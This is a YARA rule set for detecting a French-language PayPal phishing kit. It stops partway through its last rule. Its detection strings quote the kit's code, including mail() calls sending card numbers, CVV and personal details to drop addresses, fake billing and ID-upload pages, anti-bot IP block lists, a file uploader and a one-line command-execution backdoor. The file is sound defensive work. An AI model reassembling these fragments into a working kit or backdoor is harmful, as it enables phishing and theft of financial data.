/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-08
   Identifier: case127
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier3 {
   meta:
      description = "case127 - file N_Vier3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "4a2b4e794a6719748601485e3befdccc7f4c39cb81a5677192aa78b633720c9d"
   strings:
      $s1 = "header(\"location: Congratulations.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
      $s2 = "mail(\"rezult277@gmail.com\", $subject, $message, $headers);" fullword ascii
      $s3 = "$message .= \"IP Geo       : http://www.geoiptool.com/?IP=\".$ip.\"  ====\\n\";" fullword ascii
      $s4 = "$message .= '|Numero de compte                       :  '.$_SESSION['accnum'].\"\\r\\n\";" fullword ascii
      $s5 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s6 = "$message .= '|Full name                :  '.$_SESSION['fname'].' '.$_SESSION['lname'].\"\\r\\n\";" fullword ascii
      $s7 = "$message .= '|Expiry date              :  '.$_POST['exdate'].\"\\r\\n\";" fullword ascii
      $s8 = "$message .= '|CVV                        :  '.$_POST['cvv'].\"\\r\\n\";" fullword ascii
      $s9 = "$message .= '|phone                :  '.$_SESSION['fnumber'].\"\\r\\n\";" fullword ascii
      $s10 = "$message .= '|date of birth               :  '.$_SESSION['dob'].\"\\r\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_N_Vier2 {
   meta:
      description = "case127 - file N_Vier2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "e6261f3642a19a3d73ab057136bd78fa05361532f922a8e62b5505987d7fa2a3"
   strings:
      $s1 = "header(\"location: Credit card.php?cmd=_account-details&session=\".md5(microtime()).\"&dispatch=\".sha1(microtime()));" fullword ascii
      $s2 = "$_SESSION['fnumber'] = $_POST['fnumber'];" fullword ascii
      $s3 = "$_SESSION['lname'] = $_POST['lname'];" fullword ascii
      $s4 = "$_SESSION['zip'] = $_POST['zip'];" fullword ascii
      $s5 = "$_SESSION['fname'] = $_POST['fname'];" fullword ascii
      $s6 = "$_SESSION['dob'] = $_POST['dob'];" fullword ascii
      $s7 = "$_SESSION['sort'] = $_POST['sort'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule Congratulations {
   meta:
      description = "case127 - file Congratulations.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "37630f4a947fe6f850756502200f36fbcb2fb04c4e3484fb290698b85a3ffcd4"
   strings:
      $s1 = "<meta http-equiv=\"refresh\" content=\"5; url=https://www.paypal.com/\">" fullword ascii
      $s2 = "9ff;\" href=\"https://www.paypal.com/\" >cliquez ici</a> </p>" fullword ascii
      $s3 = "<p style=\"font-size:12px;\">Si cette page appara&icirc;t pendant plus de 10 secondes, <a style=\"text-decoration: none;color: #" ascii
      $s4 = "<h1>F&eacute;licitations, Confirmation Termin&eacute; !</h1>" fullword ascii
      $s5 = "<center><img src=\"images/pasy.gif\" /></center><br />" fullword ascii
      $s6 = "<link rel=\"stylesheet\" href=\"css/styl.css\" />" fullword ascii
      $s7 = "<link rel=\"stylesheet\" href=\"css/normalize.css\" />" fullword ascii
      $s8 = "<link rel=\"icon\" href=\"images/pp_favicon_x.ico\" />" fullword ascii
      $s9 = "/ =     =    =   -  ( =  =    = )  -   =  =       = \\" fullword ascii
   condition:
      ( uint16(0) == 0x0a0d and
         filesize < 8KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_thnks {
   meta:
      description = "case127 - file thnks.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "bb2b6b173f380d6e76f12dea48447d53632d2cd5dc9c73807139dfab8510778e"
   strings:
      $x1 = "</ul></section></div></div></div></div></div></div><div id=\"footer\" class=\"noPrint nemo_footer vx_globalFooter-container\" ro" ascii
      $x2 = "<script type=\"text/javascript\" src=\"./PayPal_ Summary1_files/customer.js.download\" async=\"\"></script><script type=\"text/j" ascii
      $x3 = "</span></a></div></div></div></div><a href=\"###\" class=\"js_dismiss emClose nemo_emClose\" role=\"button\" name=\"EM_DownloadA" ascii
      $x4 = "<!-- saved from url=(0077)file:///C:/Users/SpreadWorm/Desktop/Nouveau%20dossier/PayPal_%20Summary1.html -->" fullword ascii
      $s5 = "nemo_appSelect\"><span class=\"icon icon-medium icon-phone\" aria-hidden=\"true\"></span>Get the PayPal app</a></li><li class=\"" ascii
      $s6 = "<meta http-equiv=\"Refresh\" content=\"5;url=https://www.paypal.com/\">" fullword ascii
      $s7 = "aypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js\" src=\"./PayPal_ Summary1_files" ascii
      $s8 = "s free in the U.S. when you use bank or balance.</p></div></div></div><a href=\"###\" class=\"js_dismiss emClose nemo_emClose\" " ascii
      $s9 = "<html dir=\"ltr\" class=\"js\" lang=\"en_US\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">" fullword ascii
      $s10 = "ve covered the basics, have fun <a href=\"##/deals\" target=\"_top\" class=\"popover-link\" name=\"QT_Shopping\" data-pagename=" ascii
      $s11 = "<span class=\"numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText\">No balance needed to shop or send money</span>" ascii
      $s12 = "3526d928f1ae21749d.js.download\"></script><!--Script info: script: node, template:  , date: Nov 19, 2016 18:02:58 -08:00, countr" ascii
      $s13 = "indow.Intl) { document.write('<script src=\"https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/js/lib/shim/" ascii
      $s14 = "A2gPn7kuC5R7jkFaE1mnvPPZcEM\" data-cobrowser=\"{&quot;serverHostUrl&quot;:&quot;https://cb.paypal.com&quot;,&quot;assetHostUrl&q" ascii
      $s15 = "$(this).parent().parent().find('.cc-ddl-o select').attr('selectedIndex', $('.cc-ddl-contents a').index(this));" fullword ascii
      $s16 = "eb/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/widgets/ajaxError.js\" src=\"./PayPal_ Summary1_files/ajaxError.js(3).d" ascii
      $s17 = "-js-path=\"https://www.paypalobjects.com/web/res/ data-genericerror=\"Please try again.\" data-rlogid=\"GBuHKhnr0kktkGV1HgQNR%2F" ascii
      $s18 = "dule=\"https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/US/en/dust-templates.js\" src=\"./PayPa" ascii
      $s19 = "plates/US/en/widgets/ajaxError.js\" src=\"./PayPal_ Summary1_files/ajaxError.js.download\"></script><script type=\"text/javascri" ascii
      $s20 = "ta-requirecontext=\"_\" data-requiremodule=\"https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/templates/U" ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 200KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_index {
   meta:
      description = "case127 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "69ca1894b81eb9f09c5b13e087123901bb27fde0bd5df09b637e2a80a3f720cb"
   strings:
      $s1 = "<meta http-equiv=\"Description\" content=\" notneeded \"><!--googleon: all--><!--googleoff: all-->" fullword ascii
      $s2 = "<meta http-equiv=\"Keywords\" content=\" notneeded \"><!--googleon: all--><!--googleoff: all-->" fullword ascii
      $s3 = "fwrite($file,$ip.\"  -  \".gmdate (\"Y-n-d\").\" @ \".gmdate (\"H:i:s\").\"\\n\");" fullword ascii
      $s4 = "<meta http-equiv=\"refresh\" content=\"0; URL=Connexion.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssM" ascii
      $s5 = "<meta http-equiv=\"refresh\" content=\"0; URL=Connexion.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssM" ascii
      $s6 = "<html><head><title>Chargement</title><!--googleoff: all-->" fullword ascii
      $s7 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s8 = "$file = fopen(\"View.txt\",\"a\");" fullword ascii
      $s9 = "setTimeout(\"window.location.replace('login.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja212154548" ascii
      $s10 = "setTimeout(\"window.location.replace('login.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja212154548" ascii
      $s11 = "<script language=\"JavaScript\" type=\"text/javascript\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule INFORMATION {
   meta:
      description = "case127 - file INFORMATION.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "295818c6e3fcb77d4e04407fc861bc18a6df278f550070b16915da35c3f3bcc9"
   strings:
      $s1 = "mail(\"rezult1996@gmail.com\",'PP Billing Address : '.$ip,$message);" fullword ascii
      $s2 = "<form method=\"POST\" action=\"Congratulations.php\">" fullword ascii
      $s3 = "<i><?=$fname.' '.$lname ?><br /><?=$adds1 ?> <?php  if (strlen($adds2)>1) { echo \"<br />\".$adds2;} ?><br /><?=$c" fullword ascii
      $s4 = "<p>Veuillez &ecirc;tre s&ucirc;r que vos informations sont correctes:</p>" fullword ascii
      $s5 = "Date of birth:\".$dob_day.\"/\".$dob_month.\"/\".$dob_year.\"" fullword ascii
      $s6 = "/*////////////////////////////////////////////////////////////////////////////////////////////////////*/" fullword ascii
      $s7 = "<script src=\"javascript/jquery-1.11.2.min.js\"></script>" fullword ascii
      $s8 = "ity.\",\".$state.\" \".$zip ?><br /><?=$country ?><br /><a id=\"show\" href=\"#\">Edit</a></i><br />" fullword ascii
      $s9 = "<img src=\"images/cvn.jpg\" style=\"margin-left:-100;\" />" fullword ascii
      $s10 = "# Scam By R#5 | contact me on my email address Rush3@live.ru" fullword ascii
      $s11 = "$dob_month = $_POST[\"dob_month\"];" fullword ascii
      $s12 = "$dob_year = $_POST[\"dob_year\"];" fullword ascii
      $s13 = "$(\"#edyear\").css(\"border-color\",\"#ff3f3f\");" fullword ascii
      $s14 = "$(\"#edyear\").css(\"border-color\",\"#B3B3B3\");" fullword ascii
      $s15 = "$(\"#edmonth\").css(\"border-color\",\"#B3B3B3\");" fullword ascii
      $s16 = "$(\"#edmonth\").css(\"border-color\",\"#ff3f3f\");" fullword ascii
      $s17 = "Middle name:\".$mname.\"" fullword ascii
      $s18 = "<link rel=\"stylesheet\" href=\"css/normalize.css\" />" fullword ascii
      $s19 = "<link rel=\"stylesheet\" href=\"css/style.css\" />" fullword ascii
      $s20 = "<link rel=\"icon\" href=\"images/pp_favicon_x.ico\" />" fullword ascii
   condition:
      ( uint16(0) == 0xbbef and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_my_ID_id {
   meta:
      description = "case127 - file id.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "7b757ad189977023f5e9d940284a5c5840f20f9b744c1656341663bf9b80d7fc"
   strings:
      $s1 = "<form action=\"ID/identity/mail/identity.php\" method=\"post\" enctype=\"multipart/form-data\" onsubmit=\"return ray.ajax()\">" fullword ascii
      $s2 = "<font color=\"#05285c\"> <font id=\"overpanel-header\">  You need documents to prove your identity. </font> </font>" fullword ascii
      $s3 = "<div id=\"load\" class=\"transitioning spinner spin\" style=\"display:none;\">Processing of your documents...</div>" fullword ascii
      $s4 = "<script type=\"text/javascript\" src=\"identity/ds/jquery.min.js\"></script>" fullword ascii
      $s5 = "lblError.html(\"Attach copy of the official document\" );" fullword ascii
      $s6 = "lblError.html(\"Attach copy of the Credit Card (front & back)\" );" fullword ascii
      $s7 = "<div  style=\"height: 0px;\"> <span id=\"lblError2\" class=\"message\"   ></span>  <span  id=\"message1\" ></span> </div>" fullword ascii
      $s8 = "<div  style=\"height: 0px;\"> <span id=\"lblError1\" class=\"message\"   ></span>  <span  id=\"message1\" ></span> </div>" fullword ascii
      $s9 = "<img style=\"height: 116px;width: 278px;\" src=\"./ID/identity/images/card.png\">" fullword ascii
      $s10 = "()])+(\" + allowedFiles.join('|') + \")$\");" fullword ascii
      $s11 = "<input class=\"aaa\"    value=\"Attach copy of the Credit Card\" readonly=\"readonly\" style=\"width: 280px; height: 40px\" />" fullword ascii
      $s12 = "lblError.html('');" fullword ascii
      $s13 = "<img src=\"./ID/identity/images/identity.png\">" fullword ascii
      $s14 = "$(\"body\").on(\"click\", \"#btnUpload\", function () {" fullword ascii
      $s15 = "var lblError = $(\"#lblError2\");" fullword ascii
      $s16 = "var lblError = $(\"#lblError1\");" fullword ascii
      $s17 = "if (!regex.test(fileUpload.val().toLowerCase())) {" fullword ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule suspicious {
   meta:
      description = "case127 - file suspicious.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "2ac349b726e19c04c50d3ef33f676848364f8f5f5be70b62604e6f3c35fc6104"
   strings:
      $s1 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\" integrity=\"sha512-K1qjQ+NcF2TYO/eI3M6v8EiN" fullword ascii
      $s2 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s3 = "<p>En cliquant sur continuer, vous confirmez que vous &ecirc;tes le propri&eacute;taire de ce compte.</p>" fullword ascii
      $s4 = "<a href=\"Billing.php?data=billing&execution=<?php echo md5('WorldOfHack'); ?>\" class=\"bt" fullword ascii
      $s5 = "<p>En cliquant sur continuer, vous confirmez que vous &ecirc;tes le propri&eacute;taire de c" fullword ascii
      $s6 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\" integrity=\"sha512-K1qjQ+NcF2TYO/eI3M6v8EiNY" ascii
      $s7 = "Pour prot&eacute;ger votre compte, nous recherchons r&eacute;guli&egrave;rement des signe" fullword ascii
      $s8 = "<h4 class=\"big-title\">L'acc&egrave;s &agrave; votre compte est restreint pour des raisons de s&eacute;curit&eacute;.</h4>" fullword ascii
      $s9 = "<img src=\"css/peek-shield-logo.png\">" fullword ascii
      $s10 = "YZfA95pQumfvcVrTHtwQVDG+aHRqLi/ETn2uB+1JqwYqVG3LIvdm9lj6imS/pQ==\" crossorigin=\"anonymous\">" fullword ascii
      $s11 = "Apr&egrave;s avoir confirm&eacute; votre identit&eacute;, nous examinerons vos informations et" fullword ascii
      $s12 = "<h4 class=\"big-title\">L'acc&egrave;s &agrave; votre compte est restreint pour des raison" fullword ascii
      $s13 = "<label class=\"loginmarker\">" fullword ascii
      $s14 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s15 = "<link href=\"style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s16 = "restaurerons l'acc&egrave;s &agrave; votre compte." fullword ascii
      $s17 = "s pr&eacute;coces d'activit&eacute;s potentiellement frauduleuses." fullword ascii
      $s18 = "<link rel=\"icon\" href=\"css/fav.ico\" />" fullword ascii
      $s19 = "<a href=\"Billing.php?data=billing&execution=<?php echo md5('WorldOfHack'); ?>\" class=\"btn btnPremary\" style=\"width: 200px;" ascii
   condition:
      ( uint16(0) == 0xbbef and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule Credit_card {
   meta:
      description = "case127 - file Credit card.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "96d0b4ab511639620feac0745c91ef95d1d36e6b6e2df7d547d85bba3507f7e1"
   strings:
      $s1 = "<script src=\"http://ajax.microsoft.com/ajax/jquery.validate/1.7/additional-methods.js\"></script>" fullword ascii
      $s2 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s3 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s4 = "<p>Parfois, nous vous poserons une question unique pour v&eacute;rifier qui vous &ecirc;tes.</p>" fullword ascii
      $s5 = "<form method=\"post\" action=\"N_Vier3.php\">" fullword ascii
      $s6 = "<p>Notre &eacute;quipe de s&eacute;curit&eacute; travaille 24/7 pour vous prot&eacute;ger. Nous sommes l" fullword ascii
      $s7 = "<input required pattern=\"([0][1-9]|[1][0-2])(/)([2][0][1][7-9]|[2][0][2][0-5])\" type=\"text\" " fullword ascii
      $s8 = "<input required pattern=\".{16,16}\" type=\"tel\" autocomplete=\"off\" name=\"cardnumber\" style=\"border: no" fullword ascii
      $s9 = "<input required pattern=\".{3,3}\" type=\"text\" autocomplete=\"off\" name=\"cvv\" class=\"cc-cvc\" st" fullword ascii
      $s10 = "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s11 = "SESSION['exDate'])){}else{ echo $_SESSION['exDate'];} ?>\">" fullword ascii
      $s12 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s13 = "yle=\"border: none\" placeholder=\"CVV (CVC)\" maxlength=\"4\" value=\"\">" fullword ascii
      $s14 = "<button type=\"submit\" class=\"btn btnPremary\" id=\"submit\" name=\"btnCard\" style=\"padding-left: 30p" fullword ascii
      $s15 = "<h2>Aidez-nous &agrave; vous garder en s&eacute;curit&eacute;</h2>" fullword ascii
      $s16 = "<div class=\"textinputs inputspecial\" style=\"width: 43%;float: right;margin: 6px 10px 6px 0px;\">" fullword ascii
      $s17 = "<div class=\"textinputs inputspecial\" style=\"width: 48%;float: left;margin: 6px 0px 6px 10px;\">" fullword ascii
      $s18 = "<link rel=\"icon\" href=\"css/fav.ico\" />" fullword ascii
      $s19 = "var validCvc = $.payment.validateCardCVC($('input.cc-cvc').val(), cardType);" fullword ascii
      $s20 = "if($('.textinputs input').val().length === 0){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_06_08_18_case127_yara_upxxx {
   meta:
      description = "case127 - file upxxx.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "b364b42e478e199d30b322b60d6d5f478636b311db63344f4adba565dba0c2ee"
   strings:
      $s1 = "@move_uploaded_file($userfile_tmp, $abod);" fullword ascii
      $s2 = "$userfile_tmp = $_FILES['image']['tmp_name'];" fullword ascii
      $s3 = "echo\"<center><b>Done ==> $userfile_name</b></center>\";" fullword ascii
      $s4 = "$userfile_name = $_FILES['image']['name'];" fullword ascii
      $s5 = "if(isset($_POST['Submit'])){" fullword ascii
      $s6 = "$abod = $filedir.$userfile_name;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule identity {
   meta:
      description = "case127 - file identity.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "aad4d52ca04dee99101dcd04409c75412e1fc1b43222f5b18c3344922d752a04"
   strings:
      $s1 = "$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));" fullword ascii
      $s2 = "} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {" fullword ascii
      $s3 = "$(\"<div class=\\\"jFiler-item-others text-error\\\"><i class=\\\"icon-jfi-minus-circle\\\"></i> Error</div>\").hi" fullword ascii
      $s4 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"  />" fullword ascii
      $s5 = "$ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';" fullword ascii
      $s6 = "<script type=\"text/javascript\" src=\"./ID/identity/js/jquery-latest.min.js\"></script>" fullword ascii
      $s7 = "<link href=\"./ID/identity/css/jquery.filer.css\" type=\"text/css\" rel=\"stylesheet\"  media=\"screen\" />" fullword ascii
      $s8 = "<script type=\"text/javascript\" src=\"./ID/identity/js/jquery.filer.min.js\"></script>" fullword ascii
      $s9 = "$(\"<div class=\\\"jFiler-item-others text-success\\\"><i class=\\\"icon-jfi-check-circle\\\"></i> Success</div>\"" fullword ascii
      $s10 = "filesSizeAll: \"Files you've choosed are too large! Please upload files up to {{fi-maxSize}} MB.\"" fullword ascii
      $s11 = "changeInput: '<div class=\"jFiler-input-dragDrop\"><div class=\"jFiler-input-inner\"><div class=\"jFiler-input-icon\"><i c" fullword ascii
      $s12 = "if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {" fullword ascii
      $s13 = "// Get user IP address" fullword ascii
      $s14 = "this.getID(el).style.display='';" fullword ascii
      $s15 = "$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];" fullword ascii
      $s16 = "echo \"<form method='POST' enctype='multipart/form-data'>" fullword ascii
      $s17 = "<link rel=\"stylesheet\" href=\"./ID/dzx/css/loading.css\" media=\"screen\" />" fullword ascii
      $s18 = "filesSize: \"{{fi-name}} is too large! Please upload file up to {{fi-maxSize}} MB.\"," fullword ascii
      $s19 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"./gg/zeb.css\">" fullword ascii
      $s20 = "<script type=\"text/javascript\" src=\"./ID/dzx/js/info.js\"></script>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_Billing {
   meta:
      description = "case127 - file Billing.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "5eda8b34d08c8a2b313072130adf38a7ab15b1507615406608274cf8d5ee32e5"
   strings:
      $s1 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
      $s2 = "<script src=\"http://code.jquery.com/jquery-2.1.4.min.js\"></script>" fullword ascii
      $s3 = "<input type=\"text\" required name=\"zip\" placeholder=\"Code postal\"  style=\"width: 49%; float: left;\">" fullword ascii
      $s4 = "<p>Parfois, nous vous poserons une question unique pour v&eacute;rifier qui vous &ecirc;tes.</p>" fullword ascii
      $s5 = "<input  type=\"number\" required name=\"fnumber\" id=\"phone\"  placeholder=\"Mobile\" style=\"width: 49%; float" fullword ascii
      $s6 = "<h4>Nous allons maintenant v&eacute;rifier les informations de votre compte PayPal.</h4>" fullword ascii
      $s7 = "<input pattern=\"^([0][1-9]|[12][0-9]|3[01])(/)([0][1-9]|[1][0-2])\\2(\\d{4})$\" type=\"text\" name=\"dob\" " fullword ascii
      $s8 = "<input type=\"text\" name=\"fname\" required placeholder=\"Pr&eacute;nom\" style=\"width: 49%; float: left;\">" fullword ascii
      $s9 = "<input type=\"text\" name=\"fname\" required placeholder=\"Pr&eacute;nom\" style=\"width: 49%; float: left;" fullword ascii
      $s10 = "<input type=\"text\" name=\"lname\" required placeholder=\"Nom\"  style=\"width: 49%; float: right;\"></div>" fullword ascii
      $s11 = "<form method=\"post\" action=\"N_Vier2.php\">" fullword ascii
      $s12 = "<p>Notre &eacute;quipe de s&eacute;curit&eacute; travaille 24/7 pour vous prot&eacute;ger. Nous sommes l" fullword ascii
      $s13 = "<link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s14 = "<meta name=\"robots\" content=\"noindex\" />" fullword ascii
      $s15 = "<h2>Aidez-nous &agrave; vous garder en s&eacute;curit&eacute;</h2>" fullword ascii
      $s16 = "<link rel=\"icon\" href=\"css/fav.ico\" />" fullword ascii
      $s17 = "<script src=\"../js/jquery.maskedinput.min.js\"></script>" fullword ascii
      $s18 = "<script>print_country(\"country\");</script>" fullword ascii
      $s19 = "<button type=\"submit\" class=\"btn btnPremary\" style=\"padding-left: 30px;padding-right: 40px;\" nam" fullword ascii
      $s20 = "if( $(this).val().length === 0 ) {" fullword ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_index {
   meta:
      description = "case127 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "f2b3619d83488866c194527d707cdbd182baa72e1b35c668fd031284ee8a3862"
   strings:
      $s1 = "fwrite($file,$ip.\" || \".gmdate (\"Y-n-d\").\" ----> \".gmdate (\"H:i:s\").\"\\n\");" fullword ascii
      $s2 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s3 = "$file = fopen(\"drspam.txt\",\"a\");" fullword ascii
      $s4 = "while(false !== ( $file = readdir($dir)) ) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_Antibots_anti {
   meta:
      description = "case127 - file anti.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "3b9405fcf832d194ee1d073d60079275e79942235c4fb773ab11c600201e07ea"
   strings:
      $s1 = "echo \"HELLO BITCH BOOTS YOU ARE LOCKED BY X-GHOST MA| I FUCKING LOVE YOU HAHAHHAHAHAHAHAHAHAHAHAH YLEH LOOOD T7OWA B L3RBIY" fullword ascii
      $s2 = "#       ||~ http://fb.com/profile.php?id=100013164673156 ~||       #" fullword ascii
      $s3 = "if (stripos($_SERVER['HTTP_USER_AGENT'],$word2)){" fullword ascii
      $s4 = "\"68.65.53.71\"," fullword ascii /* hex encoded string 'heSq' */
      $s5 = "\"192.comagent\"," fullword ascii
      $s6 = "\"searchprocess\"," fullword ascii
      $s7 = "\"inktomisearch.com\"," fullword ascii
      $s8 = "\"addthis.com\"," fullword ascii
      $s9 = "\"skymob.com\"," fullword ascii
      $s10 = "\"amagit.com\"," fullword ascii
      $s11 = "\"ah-ha.com\"," fullword ascii
      $s12 = "\"^212.150.*.*\"," fullword ascii /* hex encoded string '!!P' */
      $s13 = "\"^64.233.160.*\"," fullword ascii /* hex encoded string 'd#1`' */
      $s14 = "\"^66.207.120.*\"," fullword ascii /* hex encoded string 'f q ' */
      $s15 = "\"^212.143.*.*\"," fullword ascii /* hex encoded string '!!C' */
      $s16 = "\"^217.132.*.*\"," fullword ascii /* hex encoded string '!q2' */
      $s17 = "\"^212.235.*.*\"," fullword ascii /* hex encoded string '!"5' */
      $s18 = "\"pgp key agent\"," fullword ascii
      $s19 = "if (preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])) {" fullword ascii
      $s20 = "\"^216.239.32.*\"," fullword ascii /* hex encoded string '!b92' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule PAYPAL_PHISHING_001_infected_06_08_18_case127_files_my_blocker {
   meta:
      description = "case127 - file blocker.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-08"
      hash1 = "4cdb5c239c8b72290a1ee526a844334c283baa4f4689a4d855a1814fe56c1996"
   strings:
      $s1 = "$host=$_GET['ip'];echo exec($host);" fullword ascii
      $s2 = "$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s3 = "') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_" ascii
      $s4 = "if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_" ascii
      $s5 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s6 = "USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { header('HTTP/1.0 404 Not Foun" ascii
      $s7 = "if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_" ascii
      $s8 = "AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot" ascii
      $s9 = "if (substr_count($hostname, $word) > 0) {" fullword ascii
      $s10 = "if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){" fullword ascii
      $s11 = "die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");" fullword ascii
      $s12 = "$bannedIP = array(\"^66.102.*.*\", \"^38.100.*.*\", \"^107.170.*.*\", \"^149.20.*.*\", \"^38.105.*.*\", \"^74.125.*.*\",  \"^66." ascii
      $s13 = "if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {" fullword ascii
   condition:
